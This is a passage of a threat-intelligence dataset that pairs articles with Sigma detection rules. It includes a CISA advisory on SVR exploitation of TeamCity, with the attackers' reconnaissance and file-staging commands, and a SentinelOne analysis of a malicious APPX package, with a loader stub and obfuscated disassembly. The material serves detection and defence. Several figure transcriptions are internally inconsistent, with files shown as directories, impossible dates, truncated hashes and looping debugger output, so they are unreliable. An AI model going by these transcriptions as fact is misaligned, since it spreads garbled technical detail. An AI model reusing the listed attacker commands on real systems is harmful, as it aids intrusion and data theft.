        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1543.003/T1543.003.md#atomic-test-4---tinyturla-backdoor-service-w64time",
        "https://www.hexacorn.com/blog/2013/09/19/beyond-good-ol-run-key-part-4/"
      ],
      "author": "frack113",
      "date": "2022-02-04",
      "modified": "2024-04-03",
      "tags": [
        "attack.persistence",
        "attack.privilege-escalation",
        "attack.t1543.003"
      ],
      "logsource": {
        "category": "registry_set",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "TargetObject|contains|all": [
            "\\System\\",
            "ControlSet",
            "\\Services\\"
          ],
          "TargetObject|endswith": "\\Parameters\\ServiceDll"
        },
        "filter_main_printextensionmanger": {
          "Details": "C:\\Windows\\system32\\spool\\drivers\\x64\\3\\PrintConfig.dll"
        },
        "filter_main_domain_controller": {
          "Image": "C:\\Windows\\system32\\lsass.exe",
          "TargetObject|endswith": "\\Services\\NTDS\\Parameters\\ServiceDll",
          "Details": "%%systemroot%%\\system32\\ntdsa.dll"
        },
        "filter_main_poqexec": {
          "Image": "C:\\Windows\\System32\\poqexec.exe"
        },
        "filter_optional_safetica": {
          "Image|endswith": "\\regsvr32.exe",
          "Details": "C:\\Windows\\System32\\STAgent.dll"
        },
        "condition": "selection and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Administrative scripts",
        "Installation of a service"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_servicedll_hijack.yml",
    "id": "1014"
  },
  {
    "url": "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a",
    "markdown": "# Russian Foreign Intelligence Service (SVR) Exploiting JetBrains TeamCity CVE Globally\n\n**Release Date**: December 13, 2023\n**Alert Code**: AA23-347A\n\n**Related topics**:\nNation-State Cyber Actors, Cyber Threats and Advisories, Securing Networks\n\n---\n\n## SUMMARY\n\nThe U.S. Federal Bureau of Investigation (FBI), U.S. Cybersecurity & Infrastructure Security Agency (CISA), U.S. National Security Agency (NSA), Polish Military Counterintelligence Service (SKW), CERT Polska (CERT.PL), and the UK’s National Cyber Security Centre (NCSC) assess Russian Foreign Intelligence Service (SVR) cyber actors—also known as Advanced Persistent Threat 29 (APT 29), the Dukes, CozyBear, and NOBELIUM/Midnight Blizzard—are exploiting CVE-2023-42793 at a large scale, targeting servers hosting JetBrains TeamCity software since September 2023.\n\nSoftware developers use TeamCity software to manage and automate software compilation, building, testing, and releasing. If compromised, access to a TeamCity server would provide malicious actors with access to that software developer’s source code, signing certificates, and the ability to subvert software compilation and deployment processes—access a malicious actor could further use to conduct supply chain operations.\n\nTo bring Russia’s actions to public attention, the authoring agencies are providing information on the SVR’s most recent compromise to aid organizations in conducting their own investigations and securing their networks, provide compromised entities with actionable indicators of compromise (IOCs), and empower private sector cybersecurity companies to better detect and counter the SVR’s malicious actions.\n\nDownload the PDF version of this report\nDownload the STIX XML\nDownload the STIX JSON\n\n---\n\n## THREAT OVERVIEW\n\nSVR cyber operations pose a persistent threat to public and private organizations’ networks globally. Since 2013, cybersecurity companies and governments have reported on SVR operations targeting victim networks to steal confidential and proprietary information. A decade later, the authoring agencies can infer a long-term targeting pattern aimed at collecting, and enabling the collection of, foreign intelligence.\n\nIn April 2021, the U.S. Government attributed a supply chain operation targeting the SolarWinds information technology company and its customers to the SVR. This attribution marked the discovery that the SVR had, since at least 2018, expanded the range of its cyber operations to include the widespread targeting of information technology companies.\n\nIn this newly attributed operation targeting networks hosting TeamCity servers, the SVR demonstrably continues its practice of targeting technology companies. By choosing to exploit CVE-2023-42793, a software development program, the authoring agencies assess the SVR could benefit from access to victims, particularly by allowing the threat actors to compromise the networks of dozens of software developers.\n\n---\n\n## TECHNICAL DETAILS\n\n### Initial Access - Exploitation\n\nThe SVR started to exploit Internet-connected JetBrains TeamCity servers in late September 2023 using CVE-2023-42793, which enables the insecure handling of specific paths allowing for bypassing authorization, resulting in arbitrary code execution on the server.\n\n### Host Reconnaissance\n\nInitial observations show the SVR used the following basic, built-in commands to perform host reconnaissance:\n\n- `whoami /priv`\n- `whoami /all`\n- `whoami /groups`\n- `whoami /domain`\n- `nltest -dclist`\n- `nltest -dsgetdc`\n- `tasklist`\n- `netstat`\n\n### File Exfiltration\n\nThe authoring agencies have observed the SVR exfiltrating files which may provide insight into the host system’s operating system:\n\n- `C:\\Windows\\system32\\ntoskrnl.exe`\n- SQL Server executable files\n- Visual Studio files\n\n### Interest in SQL Server\n\nBased on the review of the exploitation, the SVR also showed an interest in details of the SQL Server:\n\n- `powershell Compress-Archive -Path \"C:\\Program Files\\Microsoft SQL Server\\MSSQL14.MSSQLSERVER\\MSSQL\\Binn\\sqlmin.dll\" -DestinationPath C:\\Windows\\temp\\1\\sql.zip`\n\n### Tactics Used to Avoid Detection\n\nTo avoid detection, the SVR used a “Bring Your Own Vulnerable Driver” technique to disable or outright kill endpoint detection and response (EDR) and antivirus (AV) software.\n\n---\n\n## MITRE ATT&CK TACTICS AND TECHNIQUES\n\n| Technique Title | ID | Use |\n| --------------- | -- | --- |\n| Gather Victim Network Information: Network Topology | T1590.004 | SVR cyber actors may gather information about the victim’s network topology that can be used during targeting. |\n| Exploit Public-Facing Application | T1190 | SVR cyber actors exploit internet-connected JetBrains TeamCity server using CVE-2023-42793 for initial access. |\n| Command and Scripting Interpreter: PowerShell | T1059.001 | SVR cyber actors used powershell commands to compress Microsoft SQL server .dll files. |\n\n---\n\n## INDICATORS OF COMPROMISE\n\n### File IoCs\n\nGraphicalProton backdoor:\n\n- `01B5F7094DE0B2C6F8E28AA9A2DED678C166D615530E595621E692A9C0240732`\n- `34C8F155601A3948DDB0D60B582CFE87DE970D443CC0E05DF48B1A1AD2E42B5E`\n\n---\n\n## MITIGATIONS\n\n- **Apply available patches** for CVE-2023-42793 issued by JetBrains TeamCity in mid-September 2023.\n- **Monitor the network** for evidence of encoded commands and execution of network scanning tools.\n- **Require use of multi-factor authentication** for all services to the extent possible, particularly for email, virtual private networks, and accounts that access critical systems.\n\n---\n\n## REFERENCES\n\n- Russian Foreign Intelligence Service (SVR) Cyber Operations: Trends and Best Practices for Network Defenders\n- Russian SVR Targets U.S. and Allied Networks",
    "sigma_rule": {
      "title": "Enable LM Hash Storage",
      "id": "c420410f-c2d8-4010-856b-dffe21866437",
      "related": [
        {
          "id": "98dedfdd-8333-49d4-9f23-d7018cccae53",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects changes to the \"NoLMHash\" registry value in order to allow Windows to store LM Hashes.\nBy setting this registry value to \"0\" (DWORD), Windows will be allowed to store a LAN manager hash of your password in Active Directory and local SAM databases.\n",
      "references": [
        "https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-347a",
        "https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/prevent-windows-store-lm-hash-password",
        "https://www.sans.org/blog/protecting-privileged-domain-accounts-lm-hashes-the-good-the-bad-and-the-ugly/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-12-15",
      "tags": [
        "attack.defense-evasion",
        "attack.t1112"
      ],
      "logsource": {
        "product": "windows",
        "category": "registry_set"
      },
      "detection": {
        "selection": {
          "TargetObject|endswith": "System\\CurrentControlSet\\Control\\Lsa\\NoLMHash",
          "Details": "DWORD (0x00000000)"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\registry\\registry_set\\registry_set_system_lsa_nolmhash.yml",
    "id": "1021"
  },
  {
    "url": "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
    "markdown": "# Inside Malicious Windows Apps for Malware Deployment\n\n**Date:** July 14, 2022\n\nThis article discusses Windows Apps – Windows applications packaged into *APPX* or *MSIX* packages – as a medium to deploy malware. Though not as widely abused as other infection vectors, there have been a number of recent high profile attacks that use Windows Apps.\n\n- **November, 2021:** BazarBackdoor was distributed in the form of an *APPX* package.\n- **December, 2021:** Emotet malware was distributed by abusing a spoofing vulnerability in the Windows App Installer, software that installs Windows Apps.\n- **January, 2022:** Malicious Windows Apps in *APPX* format masquerading as critical browser updates were used to drop Magniber ransomware.\n- **February, 2022:** Windows Apps laced with the Electron Bot malware were uploaded to the Microsoft Store, a trusted library of Microsoft-certified packaged Windows Apps.\n\nSince Microsoft’s announcement that Office applications will by default disable the execution of Office macros in the context of documents that originate from untrusted sources, there has been an uptick in malicious actors using alternative mediums for deploying malware such as Windows Apps and Windows shortcut *LNK* files. Despite Microsoft recently rolling back the decision to disable by default Office macro execution, these media complement malicious macros and remain a threat to watch for.\n\nPrevious research on malicious Windows Apps focused on concrete system infections involving particular instances of such Apps. This article complements previous research by taking a generic perspective. I take an *APPX* package that malicious actors have used to deploy malware as a running example and provide:\n\n- A summarizing overview of the layout and content of *APPX* packages (*APPX* packages are structurally very similar to the alternative *MSIX* packages and the two Windows App packaging formats share the same deployment infrastructure).\n- An overview of selected activities that the Windows system conducts when a user installs a malicious *APPX* package.\n\nThis enables a better understanding of what occurs on a system when a user falls prey to an attack that involves a malicious Windows App – from the operating system activities at first user interaction with the file to the malware deployment that the file triggers.\n\nFor Windows to install an *APPX* package, whether malicious or not, the system first has to establish trust in the package. Microsoft provides the Microsoft Store to Windows users as a library of certified packaged Windows Apps. These packages are digitally counter-signed by Microsoft. Windows trusts by default *APPX* packages that originate from the Windows Store. However, when the Windows App sideloading feature is enabled, users can install *APPX* packages that do not originate from the Microsoft Store as well, that is, packages that are not counter-signed by Microsoft. Such are the majority of the malicious *APPX* packages that the security community has observed in attacks.\n\nIn this article, we will dig into how malicious *APPX* packages can be installed on a Windows 10 system, with a focus on how Windows establishes trust in an *APPX* package. I focus on this aspect since trust is a crucial part of the Windows App installation process. This process is what ultimately deploys malware on a system. I will use the malicious *APPX* package *edge_update.appx* (SHA1: *e491af786b5ee3c57920b79460da351ccf8f6f6b*) as a running example.\n\n## What Does a Malicious Windows App Look Like?\n\nThe `edge_update.appx` *APPX* package is signed with a code signing certificate issued to Foresee Consulting Inc. and a root certificate issued by DigiCert Trusted Root G4. Windows systems trust DigiCert root certificates and they are placed in the *Trusted Root Certification Authorities* certificate store.\n\nFigure 1 depicts the certificate chain of the digital signature of `edge_update.appx` before a Certificate Authority revoked the certificate.\n\n```image\nAlt: Figure 1: The certificate chain of the digital signature of *edge_update.appx* prior certificate revocation\nDescription: The image displays a certificate verification path for a digital signature. It shows the hierarchy of the certificate chain, starting from the root certificate 'DigiCert Trusted Root G4,' followed by a code signing certificate issued to 'Foresee Consulting Inc.' The path indicates that the digital signature is authenticated up to a trusted root authority, which is relevant for understanding the trustworthiness of the malicious Windows app discussed in the surrounding text.\nTranscription: |\n  Certificate\n  \n  General\n  Details\n  Certification Path\n  \n  Certification path\n  - DigiCert Trusted Root G4\n    - DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1\n      - Foresee Consulting Inc.\n```\n\n*APPX* packages are ZIP archive files that store the executable files that implement the packaged Windows App and additional files. Figure 2 depicts the content of `edge_update.appx`. The `eediwjus` directory stores the malicious Windows App that the executable files `eediwjus.exe` and `eediwjus.dll` implement. `eediwjus.exe` is a .NET Windows App (see Figure 3) that invokes the `mhjpfzvitta` function from `eediwjus.dll`. This function executes malicious code that is heavily control-flow obfuscated with unconditional jumps (see Figure 4). The analysis of the malicious code is out of the scope of this article.\n\n```image\nAlt: Figure 2: The content of *edge_update.appx*\nDescription: The image displays a directory listing of files within a malicious APPX package, specifically located in the path `C:\\Users\\<user>\\malicious_appx\\`. It shows the file names, their sizes, and timestamps of last modifications. The top section lists general files associated with the APPX package, including `AppxBlockMap.xml`, `AppxManifest.xml`, and `AppxSignature.p7x`, along with the malicious directory `eediwjus`. The bottom section provides a detailed view of the `eediwjus` directory, listing two executable files: `eediwjus.dll` and `eediwjus.exe`, along with their respective sizes.\nTranscription: |\n  Directory of C:\\Users\\<USER>\\malicious_appx\\\n  05/07/2022  12:47    <DIR>          .\n  05/07/2022  12:47    <DIR>          ..\n  29/12/2022  13:55    <DIR>          AppxBlockMap.xml\n  29/12/2022  13:55    <DIR>          AppxManifest.xml\n  29/12/2022  13:55    <DIR>          AppxMetadata\n  30/12/2022  12:47    <DIR>          AppxSignature.p7x\n                 2.439 AppxBlockMap.xml\n                 2.039 AppxManifest.xml\n                 8.342 AppxSignature.p7x\n                 2.216 resources.pri\n                 740  [Content_Types].xml\n                 [...]\n  \n  Directory of C:\\Users\\<USER>\\malicious_appx\\eediwjus\\\n  05/07/2022  12:47    <DIR>          .\n  05/07/2022  12:47    <DIR>          ..\n  29/12/2022  13:55         5.632 eediwjus.dll\n  29/12/2021  13:55         3.584 eediwjus.exe\n```\n\n```image\nAlt: Figure 3: The implementation of *eediwjus.exe*\nDescription: The image depicts a code snippet in C# that showcases a class named `eediwjus`. The code includes details such as the class definition, an import statement for a DLL named `eediwjus.dll`, and a method `mhjpfzvitta` that is declared as an external function. The `Main` method initializes a variable `lpBuffer` and calls the external function with this variable as an argument. The snippet is formatted with color coding to indicate different elements of the code, such as keywords and comments.\nTranscription: |\n  namespace eediwjus\n  {\n      // Token: 0x02000002 RID: 2\n      public class eediwjus\n      {\n          // Token: 0x06000001 RID: 1\n          [DllImport(\"eediwjus.dll\")]\n          private static extern void mhjpfzvitta(uint lpBuffer);\n  \n          // Token: 0x06000002 RID: 2 RVA: 0x00000250 File Offset: 0x00000250\n          private static void Main(string[] args)\n          {\n              uint lpBuffer = 5604U;\n              eediwjus.mhjpfzvitta(lpBuffer);\n          }\n      }\n  }\n```\n\n```image\nAlt: Figure 4: Control-flow obfuscated malicious code in *eediwjus.dll*\nDescription: The image displays a snippet of disassembled code, likely from the malicious executable `eediwjus.exe`. It shows various assembly language instructions, including push and jump operations, along with references to memory locations. The code is annotated with comments indicating cross-references to the function `mhjpfzvitta`, which is identified as part of the malicious behavior associated with this executable.\nTranscription: |\n  .text:0000000018000113F loc_18000113F:          ; CODE XREF: mhjpfzvitta+p\n  .text:0000000018000113F     push    rbp\n  .text:00000000180001140 loc_180001140:          ; CODE XREF: .text:00000000180001196\n  .text:00000000180001140     jmp     short loc_180001196\n  .text:00000000180001142 loc_180001142:         \n  .text:00000000180001142     push    r14\n  .text:00000000180001144 loc_180001144:          ; CODE XREF: .text:000000001800011F2\n  .text:00000000180001144     jmp     loc_1800011F2\n  .text:00000000180001146     db      83h, 99h, 21h\n  .text:00000000180001149 loc_18000114C:         \n  .text:0000000018000114C     lea     rdx, [rbp-8]\n  .text:0000000018000114C     jmp     loc_1800011E4\n  .text:00000000180001150     db      0F6h, 92h, 33h\n  .text:00000000180001153     db      7ch, 7dh\n  .text:00000000180001155 loc_18000115A:         \n  .text:0000000018000115A     mov     rbp, rsp\n  .text:0000000018000115D     jmp     short loc_1800011C9\n```\n\nIn addition to the files that implement a Windows App, an *APPX* package stores additional files, such as `AppxManifest.xml`, `AppxBlockMap.xml`, and `AppxSignature.p7x`.\n\n`AppxManifest.xml` is the package manifest, a file in XML (Extensible Markup Language) format that contains the information that Windows needs to deploy, display, and update a Windows App. This includes information about:\n\n- The publisher of the App, where the publisher is the entity that digitally signs the *APPX* package and that is responsible for the development and release of the Windows App.\n- Windows App properties, such as display name and logo.\n- Software dependencies and capabilities: The Windows system controls what system resources a Windows App can access with respect to the capabilities that the publisher has assigned to the App. System resources include the Internet, filesystem locations, and networking. In summary, Windows Apps execute in a sandboxed, access-restricted, environment for security reasons.\n\nFigure 5 depicts the content of `AppxManifest.xml` in the malicious `edge_update.appx`. The publisher of the Windows App is *Foresee Consulting Inc.*, the display name of the App is *Edge Update*, and the App has the capabilities `internetClient` and `runFullTrust`. The `internetClient` capability enables the malicious Windows App to download data from the Internet, probably a payload from an attacker-controlled endpoint.\n\n```image\nAlt: Figure 5: The content of *AppxManifest.xml* in *edge_update.appx* (trimmed for brevity)\nDescription: The image displays the content of the `AppxManifest.xml` file from the malicious `edge_update.appx` package. It includes XML code detailing the identity of the application, which is signed by Foresee Consulting Inc. The display name of the app is 'Edge Update', and it outlines several properties such as publisher information, version details, and resource requirements. Additionally, it highlights the app's capabilities, specifically 'internetClient' and 'runFullTrust', indicating that the application can access the internet and has full trust permissions within the Windows environment.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"utf-8\"?>\n  <Package xmlns=\"http://schemas.microsoft.com/appx/manifest/foundation/windows10\">\n    <Identity Name=\"3669e262-ec02-4e9d-bcbd-3d088b4afac9\" Publisher=\"CN=Foresee Consulting Inc., L=North York, S=Ontario, C=CA, SERIALNUMBER=1040913-1, OID.1.3.6.1.4.1.311.60.2.1.3=CA, OID.2.5.4.15=Private Organization\" Version=\"96.0.1072.0\" ProcessorArchitecture=\"neutral\" />\n    <Properties>\n      <DisplayName>Edge Update</DisplayName>\n      <PublisherDisplayName>Microsoft Inc</PublisherDisplayName>\n      <Logo>Images\\StoreLogo.png</Logo>\n    </Properties>\n    <Dependencies>\n      <TargetDeviceFamily Name=\"Windows.Universal\" MinVersion=\"10.0.14393.0\" MaxVersionTested=\"10.0.19041.0\" />\n      <TargetDeviceFamily Name=\"Windows.Desktop\" MinVersion=\"10.0.14393.0\" MaxVersionTested=\"10.0.19041.0\" />\n    </Dependencies>\n    <Resources>\n      <Resource Language=\"EN-US\" />\n    </Resources>\n    <Applications>\n      <Application Id=\"App\" Executable=\"eediwjus.exe\" EntryPoint=\"Windows.FullTrustApplication\">\n        <uap:SplashScreen Image=\"Images\\SplashScreen.png\" />\n        <uap:LockScreen BadgeLogo=\"Images\\BadgeLogo.png\" Notification=\"badgeAndTileText\" />\n      </Application>\n    </Applications>\n    <Capabilities>\n      <Capability Name=\"internetClient\" />\n      <rescap:Capability Name=\"runFullTrust\" />\n    </Capabilities>\n  </Package>\n```\n\n`AppxBlockMap.xml` is the package block map, a file in XML format that stores Base-64 encoded hash values of data blocks in the files that an *APPX* package archives. Windows uses these hashes to verify the data integrity of these files when installing an *APPX* package, a topic that I discuss further in this article.\n\nFigure 6 depicts the content of `AppxBlockMap.xml` in the malicious `edge_update.appx`. The `HashMethod` XML attribute specifies the hash algorithm for calculating the data block hash values in `AppxBlockMap.xml`. The `File` XML element specifies a file in the *APPX* package and the size of the file. The `Block` XML element specifies the hash value and the size of a single data block in the file. For example, a data block in `eediwjus.exe` that is 1304 bytes big has the SHA-256 hash value of *ad4f74c0c3ac37e6f1cf600a96ae203c38341d263dbac0741e602686794c4f5a* (in hexadecimal format).\n\n```image\nAlt: Figure 6: The content of *AppxBlockMap.xml* in *edge_update.appx* (trimmed for brevity)\nDescription: The image displays an XML structure representing the content of an *AppxBlockMap.xml* file from a malicious APPX package named `edge_update.appx`. It includes elements such as `HashMethod`, which specifies the hash algorithm used, and multiple `File` elements detailing individual files within the package. Each `File` entry lists attributes such as `File Name`, `Size`, and a corresponding `Block Hash`, which provides the SHA-256 hash of specific data blocks in the file.\nTranscription: |\n  <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n  <BlockMap xmlns=\"http://schemas.microsoft.com/appx/2010/blockmap\" HashMethod=\"http://www.w3.org/2001/04/xmlenc#sha256\">\n    <File Name=\"eediwjus\\eediwjus.exe\" Size=\"3584\" LfhSize=\"51\">\n      <Block Hash=\"ru90WOsNh+bz2AK2lq4gPDg8H5YusB0HmAmhnIM1Io=\" Size=\"1304\"/>\n    </File>\n    <File Name=\"eediwjus\\eediwjus.dll\" Size=\"5632\" LfhSize=\"51\">\n      <Block Hash=\"9C0gbarmyAq2IwgfMgfef+MUu1Up14eJ3YarNeRsY=\" Size=\"4280\"/>\n    </File>\n    <File Name=\"resources.pri\" Size=\"2216\" LfhSize=\"43\"/>\n    <File Name=\"AppxManifest.xml\" Size=\"2039\" LfhSize=\"46\">\n      <Block Hash=\"kMExXuwujmFwXpesPEI17NjZsArZfVULhB9=\" Size=\"902\"/>\n    </File>\n  </BlockMap>\n```\n\n`AppxSignature.p7x` is the *APPX* package signature, a PKCS (Public-Key Cryptography Standards) #7 digital signature data in ASN.1 (Abstract Syntax Notation One) format. `AppxSignature.p7x` stores signature data, such as the certificate chain of the digital signature and the actual signed data. The signed data includes hashes of files in the APPX package, such as `AppxManifest.xml` and `AppxBlockMap.xml`. Figure 7 depicts the formatted content of `AppxSignature.p7x` in the malicious `edge_update.appx`.\n\n```image\nAlt: Figure 7: The content of *AppxSignature.p7x* in *edge_update.appx* (trimmed for brevity)\nDescription: The image shows the structured content of a digital signature in ASN.1 format, specifically detailing the certificate chain related to the `edge_update.appx` APPX package. It includes sequences with object identifiers for various components such as the signature algorithm (SHA-256), the signing context for Microsoft code signing, and the common names of the involved entities: DigiCert Trusted Root G4 and Foresee Consulting Inc. This representation is crucial for understanding the security validations tied to the digital signature of malicious Windows applications.\nTranscription: |\n  SEQUENCE (2 elem)\n      OBJECT IDENTIFIER 1.2.840.113549.1.7.2 signedData (PKCS #7)\n      [0] (0 elem)\n  SEQUENCE (5 elem)\n      INTEGER 1\n      SET (1 elem)\n          SEQUENCE (2 elem)\n              OBJECT IDENTIFIER 2.16.840.1.101.3.4.2.1 sha-256 (NIST Algorithm)\n              NULL\n      SEQUENCE (2 elem)\n          OBJECT IDENTIFIER 1.3.6.1.4.1.311.2.1.4 spcIndirectDataContext (Microsoft code signing)\n          [0] (1 elem)\n              OBJECT IDENTIFIER 2.5.4.3 commonName (X.520 DN component)\n              PrintableString DigiCert Trusted Root G4\n          [...]\n          OBJECT IDENTIFIER 2.5.4.3 commonName (X.520 DN component)\n              PrintableString DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1\n          [...]\n          OBJECT IDENTIFIER 2.5.4.3 commonName (X.520 DN component)\n              PrintableString Foresee Consulting Inc.\n```\n\n## Is a Malicious Windows App Trustworthy?\n\nThe `AppxSvc` service (`Appx Deployment Service`), which the DLL (dynamic-link library) `%SystemRoot%\\System32\\appxdeploymentserver.dll` implements, orchestrates the installation of *APPX* packages. When a user installs an *APPX* package, the `AppxSvc` service verifies the data integrity of the package and verifies that the package satisfies certain trust criteria. Figure 8 depicts a simplified overview of the data integrity verification process that the `AppxSvc` service conducts.\n\n```image\nAlt: Figure 8: A simplified overview of the data integrity verification process that the *AppxSvc* service conducts\nDescription: The image is a flowchart depicting the data integrity verification process conducted by the `AppxSvc` service when installing an *APPX* package. It outlines the steps involved in verifying the package signature (`AppxSignature.p7x`), the verification of `AppxBlockMap.xml`, and the subsequent verification of data blocks specified by `AppxBlockMap.xml`. The flowchart indicates decision points where the process can either continue or terminate based on whether each verification step is successful.\nTranscription: |\n  AppxSvc verifies the package signature AppxSignature.p7x\n      ├── Verified?\n      │   ├── No\n      │   │   └── AppxSvc terminates the package installation\n      │   └── Yes\n      │       └── AppxSvc verifies AppxBlockMap.xml\n      │           ├── Verified?\n      │           │   ├── No\n      │           │   │   └── AppxSvc terminates the package installation\n      │           │   └── Yes\n      │           │       └── AppxSvc verifies the data blocks that AppxBlockMap.xml specifies\n      │           │           ├── Verified?\n      │           │           │   ├── No\n      │           │           │   │   └── AppxSvc terminates the package installation\n      │           │           │   └── Yes\n      │           │           │       └── AppxSvc continues the package installation\n```\n\nIn summary, the data integrity verification process consists of the following steps:\n\n1. The `AppxSvc` service invokes the *WinVerifyTrust* function to verify the *APPX* package signature `AppxSignature.p7x`, that is, to verify the signed data in `AppxSignature.p7x` using the certificate chain in `AppxSignature.p7x` (see Figure 7). The signed data includes hashes of files that the *APPX* package stores, including `AppxBlockMap.xml` (see Figure 6). For example, Figure 9 depicts the hash value of `AppxBlockMap.xml` in the malicious `edge_update.appx` and the same value in `AppxSignature.p7x`, the package signature of `edge_update.appx`.\n\n   ```image\n   Alt: Figure 9: The hash value of *AppxBlockMap.xml* in the package signature of *edge_update.appx*\n   Description: The image is a screenshot of a command-line interface displaying the SHA-256 hash value of a file named 'AppxBlockMap.xml'. The command executed is 'Get-FileHash', which computes the hash of the specified file. The output shows the algorithm used (SHA256) and the corresponding hash value: '025C22C3EAD2720DA646FEA322EEBEC95B5B1CD1D0991850FFD28C7890F157C9'. This screenshot is relevant to the context of validating data integrity for malicious Windows apps, specifically in relation to the data integrity verification process involving the AppxSvc service.\n   Transcription: |\n     PS C:\\Users\\<user>\\Desktop\\malicious_appx\\malicious_appx> Get-FileHash .\\AppxBlockMap.xml\n     Algorithm Hash\n     --------- ----\n     SHA256  025C22C3EAD2720DA646FEA322EEBEC95B5B1CD1D0991850FFD28C7890F157C9\n   ```\n\n2. The successful verification of the signed data in `AppxSignature.p7x` enables the `AppxSvc` service to verify the data integrity of the files whose hashes are part of the signed data, including `AppxBlockMap.xml`. The `AppxSvc` service does this by first computing the SHA-256 hash value of `AppxBlockMap.xml` and then comparing the computed value with the SHA-256 hash value of `AppxBlockMap.xml` in the previously verified signed data.\n\n3. Once the `AppxSvc` service verifies the data integrity of `AppxBlockMap.xml`, the service verifies the integrity of the data blocks that `AppxBlockMap.xml` specifies (see Figure 6). The service does this by first computing the hash values of the data blocks and then comparing the computed values with the Base-64 encoded hash values in `AppxBlockMap.xml`.\n\nThe steps above ensure that the data in an *APPX* package is credible, with the overall process relying on a successful verification of the signed data in `AppxSignature.p7x`. However, for Windows to install an *APPX* package, also a malicious package, the system also has to verify that the package satisfies a set of trust criteria.\n\nPrevious research provides more background information on the steps above. This article focuses on the trust criteria that relate to the certificates in `AppxSignature.p7x` that the `AppxSvc` service uses to verify the signed data in `AppxSignature.p7x`.\n\nThese certificates represent the root of trust for the data integrity verification of an *APPX* package and for establishing trust in the package. In addition, in contrast to other *APPX* package-internal data structures for data integrity and trust verification, the certificates are more relevant entities from an operational perspective to end-users.\n\nWhen the `AppxSvc` service installs the malicious `edge_update.appx`, the service executes:\n\n- The *CertVerifyCertificateChainPolicy* function to validate the certificates in `AppxSignature.p7x` against the following certificate validation policies: *CERT_CHAIN_POLICY_AUTHENTICODE* (2), *CERT_CHAIN_POLICY_AUTHENTICODE_TS* (3), *CERT_CHAIN_POLICY_BASE* (1), and *CERT_CHAIN_POLICY_BASIC_CONSTRAINTS* (5). Among other certificate properties, `CertVerifyCertificateChainPolicy` validates whether the certificates are valid for code signing and whether the root certificate is trusted – present in a certificate store for trusted root certificates, such as *Trusted Root Certification Authorities*.\n- The *CertGetCertificateChain* function to check the revocation status of the certificates in `AppxSignature.p7x`.\n\nIf any validation by `CertVerifyCertificateChainPolicy` or `CertGetCertificateChain` fails, the `AppxSvc` service does not establish trust in the *APPX* package and terminates the installation of `edge_update.appx`.\n\nTo demonstrate a failed validation by `CertVerifyCertificateChainPolicy`, Figure 10 depicts a scenario that I crafted: The `AppxSvc` service executes `CertVerifyCertificateChainPolicy` to validate the certificates in the package signature of `edge_update.appx` against the *CERT_CHAIN_POLICY_AUTHENTICODE* (2) and *CERT_CHAIN_POLICY_BASE* (1) certificate validation policies. The *CERT_CHAIN_POLICY_BASE* policy fails the validation of the certificates due to an untrusted root certificate – the root certificate issued by DigiCert Trusted Root G4 is not present in a certificate store for trusted root certificates. This causes the `AppxSvc` service to terminate the installation of `edge_update.appx`.\n\n```image\nAlt: Figure 10: *CertVerifyCertificateChainPolicy* fails the validation of the certificates in the package signature of *edge_update.appx* due to an untrusted root certificate\nDescription: The image depicts a debugger output showing a breakpoint hit in the `CertVerifyCertificateChainPolicy` function from the Windows `CRYPT32` library. It displays the memory address and instruction being executed, along with the value of the register `rcx` at two different points. The values of `rcx` indicate the status or result of the operation, which is often used in debugging to trace the execution flow and validate the correctness of cryptographic operations related to certificate verification.\nTranscription: |\n  Breakpoint 0 hit\n  CRYPT32!CertVerifyCertificateChainPolicy:\n  00007ffb`34485560 4c8bdc        mov     r11,rsp\n  00007ffb`34485563 488bce        mov     rcx,rdx\n  00007ffb`34485566 488bda        mov     rbx,rdx\n  00007ffb`34485569 488bcb        mov     rcx,r11\n  00007ffb`3448556c 488bce        mov     rcx,rdx\n  00007ffb`3448556f 488bda        mov     rbx,rdx\n  00007ffb`34485572 488bcb        mov     rcx,r11\n  00007ffb`34485575 488bce        mov     rcx,rdx\n  00007ffb`34485578 488bda        mov     rbx,rdx\n  00007ffb`3448557b 488bcb        mov     rcx,r11\n  00007ffb`3448557e 488bce        mov     rcx,rdx\n  00007ffb`34485581 488bda        mov     rbx,rdx\n  00007ffb`34485584 488bcb        mov     rcx,r11\n  rcx=00000000000000002\n  00007ffb`34485587 488bce        mov     rcx,rdx\n  00007ffb`3448558a 488bda        mov     rbx,rdx\n  00007ffb`3448558d 488bcb        mov     rcx,r11\n  00007ffb`34485590 488bce        mov     rcx,rdx\n  00007ffb`34485593 488bda        mov     rbx,rdx\n  00007ffb`34485596 488bcb        mov     rcx,r11\n  00007ffb`34485599 488bce        mov     rcx,rdx\n  00007ffb`3448559c 488bda        mov     rbx,rdx\n  00007ffb`3448559f 488bcb        mov     rcx,r11\n  rcx=00000000000000001\n```\n\nIn practice, `CertVerifyCertificateChainPolicy` successfully validates the certificates in the package signature of the malicious `edge_update.appx`. This is because the root certificate, which is issued by DigiCert Trusted Root G4, is present in the *Trusted Root Certification Authorities* certificate store.\n\n## Revoked, or Not, That is the Question\n\nThe `AppxSvc` service executes the `CertGetCertificateChain` function to check the revocation status of the certificates in the package signature of `edge_update.appx`, starting from the end certificate in the certificate chain – the one issued to Foresee Consulting Inc. (see Figure 11).\n\n```image\nAlt: Figure 11: The certificate issued to Foresee Consulting Inc. in the context of the *CertGetCertificateChain* function (in ASN.1 format)\nDescription: The image presents a hexadecimal and ASCII dump of a file, likely related to a certificate or digital signature. The dump includes addresses, hexadecimal values, and their corresponding ASCII representations. It appears to contain details about a certificate associated with Foresee Consulting Inc., as 